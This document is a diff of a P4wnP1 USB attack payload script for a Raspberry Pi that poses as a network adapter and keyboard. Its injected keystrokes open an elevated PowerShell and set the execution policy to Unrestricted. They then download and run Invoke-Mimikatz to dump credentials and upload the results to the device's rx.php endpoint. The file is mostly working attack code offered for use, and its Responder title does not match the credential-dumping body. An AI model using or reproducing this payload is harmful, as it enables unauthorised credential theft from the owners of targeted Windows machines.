@@ -1,4 +1,4 @@
-# Execute Mimikatz via Powershell in memory
+# Execute local Responder and take over network of victim
 
 # =============================
 # USB setup
@@ -6,11 +6,14 @@
 # Make sure to change USB_PID if you enable different USB functionality in order
 # to force Windows to enumerate the device again
 USB_VID="0x1d6b"        # Vendor ID
-USB_PID="0x110c"        # Product ID
+USB_PID="0x0137"        # Product ID
 
 # Overwrite default settings (setup.cfg) for keyboard funtion
+USE_ECM=true            # if true CDC ECM will be enabled
 USE_RNDIS=true          # if true RNDIS will be enabled
 USE_HID=true            # if true HID (keyboard) will be enabled
+USE_RAWHID=false         # if true HID (keyboard) will be enabled
+USE_UMS=false                   # if true USB Mass Storage will be enabled
 
 # ==========================
 # Network and DHCP options
@@ -18,9 +21,8 @@ USE_HID=true            # if true HID (keyboard) will be enabled
 
 # We choose an IP with a very small subnet (see comments in README.rst)
 IF_IP="172.16.0.1" # IP used by P4wnP1
-IF_MASK="255.255.255.252" 
+IF_MASK="255.255.255.252"
 IF_DHCP_RANGE="172.16.0.2,172.16.0.3" # DHCP Server IP Rang
-
 
 # =====================
 # Keyboard config
@@ -29,31 +31,35 @@ IF_DHCP_RANGE="172.16.0.2,172.16.0.3" # DHCP Server IP Rang
 lang="us"
 USE_HID_TEST=false
 
-# Payload configuration via HID interface
-
+# This function gets called after the target network interface is working
+# (RNDIS, CDC ECM or both have to be enabled)
 function onNetworkUp()
 {
-	echo "Network up"
-	echo "Active device $active_interface"
-	echo "P4wnP1 IP $IF_IP"
-	echo "P4wnP1 netmask $IF_MASK"
-	echo "Network is running"
+        echo "Network up"
+        echo "Active device $active_interface"
+        echo "P4wnP1 IP $IF_IP"
+        echo "P4wnP1 netmask $IF_MASK"
+        echo "Network is running"
 
-	python SimpleHTTPServer 
+        php -S 0.0.0.0:80 -t /home/pi/P4wnP1/webserver
+        echo "Webserver running"
 }
 
-
+# this function gets called if the target received a DHCP lease
+# (DHCP client has to be running on target)
 function onTargetGotIP()
 {
-	echo "DHCP Lease given to target"
-	echo "Target IP $target_ip"
+        echo "DHCP Lease given to target"
+        echo "Target IP $target_ip"
 
- 	# add DNS entry for google DNS
-	echo nameserver 8.8.8.8 > /etc/resolv.conf
+        # add route back through target (for ICS)
+        route add -net default gw $target_ip
 
-	echo "Target got IP $target_ip via DHCP"
+        # add DNS entry for google DNS
+        echo nameserver 8.8.8.8 > /etc/resolv.conf
+
+        echo "Target got IP $target_ip via DHCP"
 }
-
 
 function onKeyboardUp()
 {
@@ -61,31 +67,37 @@ function onKeyboardUp()
         # if this method gets called, we know the HID keyboard stack is usable
 
         cat <<- EOF | duckhid
-				
-				REM ---- Starting Powershell with Admin privs
-				DELAY 3000
-				CONTROL ESCAPE
-				DELAY 1000
-				STRING powershell Start-Process cmd -Verb runAs
-				ENTER
-				DELAY 3000
-				ALT y
-				DELAY 500
+
+                REM ---- Starting Powershell with Admin privs
+                DELAY 3000
+                GUI r
+                DELAY 1000
+                STRING powershell Start-Process powershell -Verb runAs
+                ENTER
+                DELAY 3000
+                ALT y
+                DELAY 500
 
 
-#				REM ---- Change the Execution Policy
-#				STRING Set-ExecutionPolicy Unrestricted
-#				DELAY 500
-#				ENTER
-#				DELAY 500
-#				STRING A
-#				DELAY 500
-#				ENTER
+                REM ---- Change the Execution Policy
+                DELAY 2000
+                STRING Set-ExecutionPolicy Unrestricted
+                DELAY 2000
+                ENTER
+                DELAY 500
+                STRING A
+                DELAY 500
+                ENTER
 
-				REM ---- Download and run Mimikatz
-				STRING powershell -nop -c "IEX (New-Object Net.WebClient).DownloadString('http://172.16.0.1:8000/Invoke-Mimikatz.ps1')"; $output = Invoke-Mimikatz -DumpCreds; (New-Object Net.WebClient).UploadString('http://172.16.0.1/rx.php', $output)"
-				ENTER
-				DELAY 15000
+
+                REM ---- Download and run Mimikatz
+                DELAY 2000
+                STRING IEX (New-Object Net.WebClient).DownloadString('http://172.16.0.1/Invoke-Mimikatz.ps1'); \$output = Invoke-Mimikatz -DumpCreds; (New-Object Net.WebClient).UploadString('http://172.16.0.1/rx.php', \$output)
+                DELAY 2000
+                ENTER
+                DELAY 15000
+                STRING exit
+                ENTER
 
 EOF
 
